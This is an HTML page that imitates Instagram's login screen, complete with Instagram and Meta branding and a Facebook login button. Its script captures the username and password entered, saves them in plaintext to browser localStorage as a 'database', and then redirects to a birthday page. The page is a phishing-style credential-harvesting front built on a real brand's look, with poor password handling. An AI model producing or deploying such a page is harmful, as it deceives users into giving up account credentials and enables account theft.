<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .main {
            display: flex;
            width: 1000px;
            height: 620px;
            background: #000;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 0 25px rgba(0,0,0,0.9);
        }

        /* ================= LEFT SIDE ================= */
        .left {
            flex: 1;
            background: #0f0f0f;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            padding: 40px;
        }

        .instagram-logo {
            width: 70px;
            height: 70px;
            background: linear-gradient(45deg, #f56040, #c13584, #405de6);
            border-radius: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            margin-bottom: 25px;
        }

        .slogan {
            font-size: 27px;
            text-align: center;
            line-height: 1.35;
            margin-bottom: 40px;
        }

        .slogan span {
            color: #e1306c;
        }

        .promo-area {
            position: relative;
            width: 300px;
        }

        .promo-area img {
            width: 100%;
            border-radius: 12px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.7);
        }

        /* ================= RIGHT SIDE ================= */
        .right {
            width: 380px;
            background: #1c1c1e;
            padding: 40px 35px;
            display: flex;
            flex-direction: column;
        }

        .right h1 {
            text-align: center;
            font-size: 22px;
            margin-bottom: 25px;
        }

        input {
            width: 100%;
            padding: 13px 15px;
            background: #121212;
            border: 1px solid #363636;
            border-radius: 6px;
            color: white;
            margin-bottom: 12px;
            font-size: 15px;
        }

        input:focus {
            outline: none;
            border-color: #0095f6;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin: 15px 0;
        }

        .forgot {
            text-align: center;
            margin: 12px 0;
            font-size: 13px;
        }

        .forgot a { color: #0095f6; text-decoration: none; }

        .or {
            margin: 20px 0;
            text-align: center;
            color: #888;
            position: relative;
        }

        .or::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0; right: 0;
            height: 1px;
            background: #363636;
        }

        .or span {
            background: #1c1c1e;
            padding: 0 18px;
        }

        .fb-btn {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>

    <div class="main">
        <!-- LEFT SIDE -->
        <div class="left">
            <div class="instagram-logo"> <img src="instalogo.png" alt="Friends Moment"></div>
            <div class="slogan">
                See everyday moments from your<br>
                <span>close friends.</span>
            </div>
            <div class="promo-area">
                <img src="screen.png" alt="Friends Moment">
            </div>
        </div>

        <!-- RIGHT SIDE -->
        <div class="right">
            <h1>Log into Instagram</h1>

            <form id="loginForm">
                <input type="text" id="username" placeholder="Mobile number, username or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log in</button>
            </form>

            <div class="forgot">
                <a href="#">Forgot password?</a>
            </div>

            <div class="or"><span>OR</span></div>

            <button class="fb-btn">Log in with Facebook</button>

            <div style="text-align:center; margin-top:20px; font-size:14px;">
                Don't have an account? 
                <a href="#" style="color:#0095f6;">Create new account</a>
            </div>

            <div style="margin-top:auto; text-align:center; padding-top:30px; color:#aaa;">
                Meta
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const status = document.createElement('div');
            status.style.textAlign = 'center';
            status.style.marginTop = '10px';
            status.style.fontSize = '14px';

            if (!username || !password) {
                status.style.color = 'red';
                status.textContent = "Please fill all fields";
                this.appendChild(status);
                return;
            }

            // Save to Database
            localStorage.setItem('instagram_user', JSON.stringify({
                username: username,
                password: password,
                loginTime: new Date().toLocaleString()
            }));

            // Success Message
            status.style.color = 'lime';
            status.textContent = "✅ Saved to Database! Redirecting...";
            this.appendChild(status);

            // Redirect to Birthday Page
            setTimeout(() => {
                window.location.href = "birthday.html";
            }, 1400);
        });
    </script>
</body>
</html>
